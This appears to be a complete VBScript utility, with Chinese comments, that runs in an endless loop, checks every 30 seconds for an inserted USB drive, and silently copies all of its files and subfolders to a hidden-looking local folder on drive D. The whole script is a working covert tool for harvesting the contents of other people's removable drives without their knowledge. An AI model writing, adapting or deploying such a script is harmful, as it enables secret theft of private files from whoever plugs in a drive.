Const DestPath="D:\000\1\WQD012-100830\"
Dim fso,Disks 
Set fso = CreateObject("Scripting.FileSystemObject")
Do
  n=n+1
  Set Disks = fso.Drives 
  For Each Disk In Disks 
    If Disk.IsReady And Disk.DriveType = 1 Then 
      Udisk=Disk.DriveLetter & ":\"
      U=True
    End if
  Next
  If U=True Then
    CopyFolder Udisk, DestPath
  Else
    If n=0 Then 
      Msgbox "!",vbOkOnly,"提示"
    End if
  End If
  WScript.Sleep 30000  '每30秒循环一次
Loop

Function CopyFolder(source, destination)
  Dim s,d,f,path
  
  If Not fso.FolderExists(destination) Then
    fso.CreateFolder destination
  End If
  
  Set s = fso.getfolder(source)
  Set d = fso.GetFolder(destination)
  For Each f In s.Files
	path = d.Path & "\" & f.Name
    'If fso.GetExtensionName(f.path)="xls" OR fso.GetExtensionName(f.path)="xlsx" Then
      fso.CopyFile f.Path,path,True '设置为True，表示如果文件存在则覆盖
    'End if
  Next
  For Each f In s.subfolders
    path = d.Path & "\" & f.Name
    CopyFolder f.path, path '递归查找子目录
  Next
End Function
